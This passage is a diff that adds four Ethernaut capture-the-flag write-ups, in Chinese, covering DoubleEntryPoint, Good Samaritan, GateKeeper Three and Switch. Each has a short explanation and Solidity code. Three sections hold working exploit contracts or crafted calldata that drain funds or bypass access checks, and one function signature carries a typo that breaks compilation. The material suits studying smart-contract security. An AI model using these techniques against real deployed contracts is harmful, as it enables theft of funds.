@@ -538,3 +538,147 @@ contract Hack1 {
     }
 }
 ```
+
+## 27. DoubleEntryPoint
+LGT代币重写了transfer函数, DET代币可以通过LGT的transfer函数转移代币, 
+利用这一点CryptoVault的sweepToken函数可以通过LGT代币转移DET代币,
+通过DoubleEntryPoint合约获取cryptoVault, forta地址
+AlertBot需要阻止delegateTransfer函数调用, 此时handleTransaction函数可以获取到forta.notify()的msg.data
+从msg.data中解析出oriSender, 如果oriSender为cryptoVault, 则调用raiseAlert()函数
+
+参考: https://blog.dixitaditya.com/ethernaut-level-26-doubleentrypoint
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+interface IDetectionBot {
+    function handleTransaction(address user, bytes calldata msgData) external;
+}
+
+interface IForta {
+    function setDetectionBot(address detectionBotAddress) external;
+    function notify(address user, bytes calldata msgData) external;
+    function raiseAlert(address user) external;
+}
+
+contract AlertBot is IDetectionBot {
+    address cryptoVault = 0x67Ce4F0e71c82a278228DcAEb1830cdeE0DCFb95;
+
+    function handleTransaction(address user, bytes calldata msgData) external override {
+
+        address origSender;
+        assembly {
+            origSender := calldataload(0xa8)
+        }
+
+        if(origSender == cryptoVault) {
+            IForta(msg.sender).raiseAlert(user);
+        }
+    }
+}
+
+```
+
+## 28. Good Samaritan
+当调用requestDonation函数时, 底层的transfer函数会调用dest合约的notify函数, 此时触发NotEnoughBalance 错误
+可以使requestDonation转移剩余所有代币到Hack合约,
+注意只在notify函数amount为10时触发错误, 否则后续的transferRemainder函数也会失败
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+interface INotifyable {
+    function notify(uint256 amount) external;
+}
+
+interface Coin {
+    function balances(address) external view returns(uint256);
+
+}
+
+interface Wallet {
+    
+}
+
+interface GoodSamaritan {
+    function requestDonation() external returns (bool);
+}
+
+contract Hack {
+    Coin c = Coin(0xfCb5F4521019d4E1fC1F7d692881b41D991Fdb61);
+    Wallet w = Wallet(0x2Db97F6fa08c90FC9467246Ac1713B6b3509363F);
+    GoodSamaritan g = GoodSamaritan(0x7c5565188Fe17947BDD793C2D03284a0D9b93979);
+    error NotEnoughBalance();
+
+    constructor() {
+    }
+
+    function attack() public {
+        bool r = g.requestDonation();
+        require(r == false, "not triggered");
+        require(c.balances(address(w))==0, "not finished");
+    }
+
+    function notify(uint256 amount) pureF external {
+        if (amount == 10) {
+            revert NotEnoughBalance();
+        }
+    }
+}
+```
+## 29. GateKeeper Three
+通过合约调用construct0r函数, 并通过相同合约调用enter函数绕过gateOne限制,
+同一笔tx中的block.timestamp变量都相同, 先createTrick初始化trick, 再调用getAllowance绕过gateTwo
+向GatekeeperThree转0.0011ether, 并且Hack合约不实现receive函数绕过gateThree
+ 
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+interface GatekeeperThree {
+    function entrant() external view returns(address);
+    function owner() external view returns(address);
+    function allowEntrance() external view returns(bool);
+    function getAllowance(uint256 _password) external;
+    function construct0r() external;
+    function createTrick() external;
+    function enter() external;
+}
+
+contract Waste {}
+
+contract Hack {
+    GatekeeperThree g = GatekeeperThree(0xF9063Fc07Ac180824613FC3B906C952050A54FEB);
+
+    constructor() {
+        g.construct0r();
+        g.createTrick();
+        g.getAllowance(block.timestamp);
+    }
+
+    function attack() public {
+        require(payable(address(g)).balance > 0.001 ether, "not fund");
+        g.enter();
+        require(g.entrant() == tx.origin, "not finished");
+    }
+}
+```
+
+## 30. Switch
+要将switchOn变量改为true, 必须触发turnSwitchOn()函数, 该函数又只能由合约本身调用,
+因此只能通过flipSwitch函数触发,
+flipSwitch函数限制了调用data的函数为turnSwitchOff, 需要构造calldata既能满足条件,又能调用到turnSwitchOn函数
+构造合适的calldata, 欺骗flipSwitch函数, 使其调用turnSwitchOn函数
+flipSwitch读取calldata的调用函数是硬编码的,可以利用
+注意不要通过合约ABI函数调用, 直接使用calldata
+```solidity
+Switch s = new Switch();
+vm.startPrank(eoaAddress);
+address(s).call(hex'30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000');
+vm.stopPrank();
+```
+参考:https://degatchi.com/articles/reading-raw-evm-calldata
+![img.png](../images/img.png)
